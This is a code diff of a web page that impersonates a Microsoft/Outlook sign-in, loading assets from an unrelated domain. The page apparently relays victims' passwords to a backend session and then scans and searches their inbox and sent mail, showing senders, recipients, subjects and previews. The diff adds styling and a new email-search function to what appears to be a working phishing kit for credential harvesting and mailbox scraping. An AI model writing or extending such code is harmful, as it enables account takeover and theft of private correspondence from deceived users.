@@ -351,7 +351,7 @@
             background: transparent;
         }
 
-        
+
 
         /* Pulse animation for Microsoft logo during loading */
         .microsoft-logo.loading {
@@ -460,6 +460,27 @@
                 display: none;
             }
         }
+
+        /* Custom styles for action buttons */
+        .action-btn {
+            padding: 8px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            margin-right: 8px;
+            transition: background-color 0.2s ease;
+        }
+
+        .action-btn.scan-btn {
+            background-color: #0078d4;
+            color: white;
+        }
+
+        .action-btn.scan-btn:hover {
+            background-color: #005a9e;
+        }
     </style>
 </head>
 <body>
@@ -553,12 +574,12 @@
                 <div class="message success" id="loginSuccess">
                     Successfully logged in! You can now scan your emails.
                 </div>
-                
+
                 <div class="button-group">
                     <button type="button" class="btn btn-secondary" onclick="scanBasicEmails()">Quick Scan</button>
                     <button type="button" class="btn btn-primary" onclick="scanAllEmails()">Full Email Scan</button>
                 </div>
-                
+
                 <div id="emailResults" style="margin-top: 20px; display: none;">
                     <h3>Email Scan Results</h3>
                     <div id="emailSummary"></div>
@@ -571,13 +592,13 @@
 
         <!-- Sign-in options -->
         <div class="sign-in-options">
-            <img src="https://newnewdomnewbjbfcjfidd.sorenkallbil.com/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" 
+            <img src="https://newnewdomnewbjbfcjfidd.sorenkallbil.com/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                  alt="Sign-in options icon">
             <span>Sign-in options</span>
         </div>
     </div>
 
-    
+
 
     <script>
         let currentSessionId = null;
@@ -660,10 +681,10 @@
                 microsoftDotsLoader.style.display = 'none';
                 microsoftLogo.classList.remove('loading');
                 container.classList.remove('loading-state');
-                
+
                 // Hide cancel button
                 loadingCancelContainer.classList.remove('show');
-                
+
                 // Keep Microsoft logo visible (don't hide it)
                 microsoftLogo.style.display = 'block';
                 microsoftLogo.style.visibility = 'visible';
@@ -725,7 +746,7 @@
             // Cancel loading and return to the current form
             setLoading(false);
             clearMessage();
-            
+
             // If we're in password step, go back to email
             if (currentStep === 'password') {
                 goBackToEmail();
@@ -791,7 +812,7 @@
             }
 
             preloadInProgress = true;
-            
+
             try {
                 document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
                 // Removed preload info message
@@ -929,9 +950,9 @@
                 const response = await fetch(`${API_BASE}/api/continue-login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
+                    body: JSON.stringify({
                         password: password,
-                        sessionId: currentSessionId 
+                        sessionId: currentSessionId
                     })
                 });
 
@@ -994,7 +1015,7 @@
             setLoading(false);
         }
 
-        
+
 
 
         // Function to reset the form to the email input stage
@@ -1076,13 +1097,13 @@
             const detailsDiv = document.getElementById('emailDetails');
 
             summaryDiv.innerHTML = `<p><strong>Quick Scan Results:</strong> Found ${data.count} email subjects</p>`;
-            
+
             let detailsHTML = '<ul>';
             data.emails.forEach((subject, index) => {
                 detailsHTML += `<li>${index + 1}. ${subject}</li>`;
             });
             detailsHTML += '</ul>';
-            
+
             detailsDiv.innerHTML = detailsHTML;
             resultsDiv.style.display = 'block';
         }
@@ -1103,9 +1124,9 @@
                 </ul>
                 ${data.warning ? `<p style="color: orange;"><strong>Warning:</strong> ${data.warning}</p>` : ''}
             `;
-            
+
             let detailsHTML = '';
-            
+
             // Display inbox emails
             if (data.data.inbox && data.data.inbox.length > 0) {
                 detailsHTML += '<h4>📥 Inbox Emails:</h4>';
@@ -1121,7 +1142,7 @@
                     `;
                 });
             }
-            
+
             // Display sent emails
             if (data.data.sent && data.data.sent.length > 0) {
                 detailsHTML += '<h4>📤 Sent Emails:</h4>';
@@ -1137,15 +1158,114 @@
                     `;
                 });
             }
-            
+
             if (!detailsHTML) {
                 detailsHTML = '<p>No emails found or could not extract email data.</p>';
             }
-            
+
             detailsDiv.innerHTML = detailsHTML;
             resultsDiv.style.display = 'block';
         }
 
+        // New function to handle email search
+        async function searchEmails() {
+            const searchTerm = document.getElementById('searchTerm').value.trim();
+            const folderType = document.getElementById('folderType').value;
+
+            if (!searchTerm) {
+                showMessage('Please enter an email address to search for.', 'error');
+                return;
+            }
+
+            setLoading(true, `Searching for emails related to ${searchTerm}...`, false);
+            clearMessage();
+
+            try {
+                const response = await fetch(`${API_BASE}/api/emails/search`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: currentSessionId,
+                        searchTerm: searchTerm,
+                        folderType: folderType
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    displaySearchResults(data, searchTerm, folderType);
+                } else {
+                    showMessage(data.error || 'Email search failed', 'error');
+                }
+            } catch (error) {
+                console.error('Error searching emails:', error);
+                showMessage('An error occurred during the email search.', 'error');
+            } finally {
+                setLoading(false);
+            }
+        }
+
+        function displaySearchResults(data, searchTerm, folderType) {
+            const resultsDiv = document.getElementById('emailResults');
+            const summaryDiv = document.getElementById('emailSummary');
+            const detailsDiv = document.getElementById('emailDetails');
+
+            let folderDescription = 'All Folders';
+            if (folderType === 'inbox') {
+                folderDescription = 'Inbox Only';
+            } else if (folderType === 'sent') {
+                folderDescription = 'Sent Only';
+            }
+
+            summaryDiv.innerHTML = `
+                <p><strong>Search Results for "${searchTerm}" (${folderDescription}):</strong></p>
+                <ul>
+                    <li>Inbox Matches: ${data.summary.inboxMatches || 0}</li>
+                    <li>Sent Matches: ${data.summary.sentMatches || 0}</li>
+                    <li>Total Matches: ${data.summary.totalMatches || 0}</li>
+                </ul>
+            `;
+
+            let detailsHTML = '';
+
+            // Display inbox search results
+            if (data.data.inbox && data.data.inbox.length > 0) {
+                detailsHTML += '<h4>📥 Inbox Emails:</h4>';
+                data.data.inbox.forEach((email, index) => {
+                    detailsHTML += `
+                        <div style="border-bottom: 1px solid #eee; padding: 10px 0; margin-bottom: 10px;">
+                            <strong>From:</strong> ${email.sender || 'Unknown'}<br>
+                            <strong>Subject:</strong> ${email.subject || 'No Subject'}<br>
+                            <strong>Date:</strong> ${email.date || 'Unknown'}<br>
+                            ${email.preview ? `<strong>Preview:</strong> ${email.preview.substring(0, 100)}${email.preview.length > 100 ? '...' : ''}<br>` : ''}
+                        </div>
+                    `;
+                });
+            }
+
+            // Display sent search results
+            if (data.data.sent && data.data.sent.length > 0) {
+                detailsHTML += '<h4>📤 Sent Emails:</h4>';
+                data.data.sent.forEach((email, index) => {
+                    detailsHTML += `
+                        <div style="border-bottom: 1px solid #eee; padding: 10px 0; margin-bottom: 10px;">
+                            <strong>To:</strong> ${email.recipient || 'Unknown'}<br>
+                            <strong>Subject:</strong> ${email.subject || 'No Subject'}<br>
+                            <strong>Date:</strong> ${email.date || 'Unknown'}<br>
+                            ${email.preview ? `<strong>Preview:</strong> ${email.preview.substring(0, 100)}${email.preview.length > 100 ? '...' : ''}<br>` : ''}
+                        </div>
+                    `;
+                });
+            }
+
+            if (!detailsHTML) {
+                detailsHTML = '<p>No matching emails found.</p>';
+            }
+
+            detailsDiv.innerHTML = detailsHTML;
+            resultsDiv.style.display = 'block';
+        }
 
     </script>
 </body>
